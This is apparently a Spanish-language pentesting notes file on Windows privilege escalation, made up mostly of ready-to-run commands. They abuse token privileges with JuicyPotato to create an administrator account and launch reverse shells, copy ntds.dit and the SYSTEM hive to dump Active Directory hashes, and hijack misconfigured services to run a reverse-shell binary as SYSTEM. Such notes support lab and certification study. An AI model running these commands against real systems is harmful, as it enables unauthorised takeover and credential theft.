## Windows Privilege Escalation

Técnicas utilizadas para escalar privilegios en sistemas basados en Windows.

### Recursos

[Hacktricks - Windows Privesc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

[Payload All The Things - Windows Privesc Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[Sushant Guide OSCP](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

[Another good guide](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-windows)


### Técnicas comúnes para escalar privilegios 


- [Abusing Tokens](#whoami-priv)
  - [SeImpersonatePrivilege](#SeImpersonatePrivilege)
  - [SeBackupPrivilege & SeRestorePrivilege](#SeBackupPrivilege-And-SeRestorePrivilege)
- [Privileged Groups](#whoami-groups)
- [Servicios Vulnerables](#Servicios-Vulnerables)
  - [Insecure Permissions](#Insecure-Permissions)
  - [Unquoted Service Path](#Unquoted-Service Path)
  - [Weak Registry Permissions](#Weak-Registry Permissions)

## whoami priv

[Hacktricks Guide](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

**Lista de Tokens de Acceso interesantes**

|Privilege|Privilege|
|--|--|
|**SeImpersonatePrivilege**|**SeAssignPrimaryPrivilege**|
|**SeTcbPrivilege**|**SeBackupPrivilege**|
|**SeRestorePrivilege**|**SeCreateTokenPrivilege**|
|**SeLoadDriverPrivilege**|**SeTakeOwnershipPrivilege**|
|**SeDebugPrivilege**||

### SeImpersonatePrivilege

#### Mediante una Reverse Shell

**Tool**: JuicyPotato.exe 
```cmd
.\jp.exe -t * -l 1333 -p "c:\windows\system32\cmd.exe" -a "/c c:\windows\temp\rev.exe" -c <clsid> (optional)
```
#### Creando nuestro propio usuario
```cmd
.\jp.exe -t * -l 1333 -p "c:\windows\system32\cmd.exe" -a "/c net user chan chan123 /ADD"
```
**Agregándo nuestro usuario al grupo Local Administrators**
```cmd
.\jp.exe -t * -l 1333 -p "c:\windows\system32\cmd.exe" -a "/c net localgroup Administrators chan /add" 
```
**Cambiando el registro LocalAccountTokenFilterPolicy para poder tener acceso remoto**
```cmd
.\jp.exe -t * -l 1333 -p "c:\windows\system32\cmd.exe" -a "/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" 
```
 
### SeBackupPrivilege And SeRestorePrivilege

**Crear una lista de instrucciones que serán ejecutadas con Diskshadow (Herramienta de gestión de discos)**

```bash
SET CONTEXT PERSISTENT NOWRITERS#
add volume c: alias chan#
create#
expose %chan% z:#
```
**Lo subimos a nuestro target y ejecutamos**
```cmd
diskshadow /s fichero_instrucciones.txt
```

**Luego subimos e importamos dos Dlls que nos servirán para copiar archivos entre discos**

[Dlls utilizados](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

**Copiamos el ntds.dit (Base de datos que almacena hashes del AD)**
```powershell
Copy-FileSeBackupPrivilege z:\windows\NTDS\ntds.dit c:\temp\ntds.dit
```
**Guardamos la llave system del registro de windows**
```powershell
reg save HKLM/SYSTEM c:\temp\system
```
**Dumpeamos los hashes con impacket-secretsdump y voila**
```bash
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL
```

## whoami groups

[Guía detallada](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges)

### Dns admins

***HTB Machine*** : **Resolute**


## Servicios Vulnerables

**Obtener lista de servicios**

```cmd
net start
wmic service list brief
sc query
Get-Service
```
**Obtener permisos del servicio**

```cmd
sc qc <service_name>
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

**Ver si Authenticated Users pueden modificar el servicio**

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

### Insecure Permissions

**Podemos usar accesschk.exe para verificar los permisos del usuario actual sobre un servicio en específico**
```cmd
.\accesschk.exe /accepteula -uwcqv <user> daclsvc
```
**En caso de tener el permiso `SERVICE_CHANGE_CONFIG` podemos aprovecharnos y modificar la propiedad `BINARY_PATH_NAME`**

Es necesario consultar si el servicio corre como SYSTEM mirando la propiedad `SERVICE_START_NAME`
```cmd
sc qc daclsvc
```
Modificamos la configuración del servicio y establecemos el BINARY_PATH_NAME (binpath) al de una reverse shell o un binario que queramos ejecutar

```cmd
sc config daclsvc binpath= "C:\tmp\reverse.exe"
```
Ponemos un socket de escucha e iniciamos el servicio

```cmd
net start daclsvc
```

### Unquoted Service Path 

[Explicación](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae#:~:text=When%20a%20service%20is%20created,of%20the%20time%20it%20is)


**Primero debemos verificar que el servicio está corriendo como SYSTEM observando la propiedad `SERVICE_START_NAME` y también checkear si el nombre tiene espacios en el path mirando la propiedad `BINARY_PATH_NAME` **

```cmd
sc qc unquotedsvc
```

**Luego verificamos los permisos de la carpeta donde se ubica el binario real**
```cmd
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
icacls "C:\Program Files\A Subfolder"
```
**Ahora copiamos la reverse shell en el folder final donde se situaba el binario**

```cmd
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

**Iniciamos el servicio**
```cmd
net start unquotedsvc
```

### Weak Registry Permissions

Consultamos el servicio `regsvc` y verificamos si está corriendo como SYSTEM (`SERVICE_START_NAME`).
```cmd
sc qc regsvc
```
Verificamos si el servicio es writable por algun grupo al que pertenezcamos, si sale `NT_AUTHORITY\Interactive` quiere decir que es modificable por cualquier usuario logueado.

```cmd
C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
```

Sobrescribimos la llave del registro ImagePath para que apunte al ejecutable reverse.exe que hemos creado

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
Iniciamos un listener en Parrot y luego iniciamos el servicio para generar una shell reversa que se ejecute con privilegios de SYSTEM

```cmd
net start regsvc
```




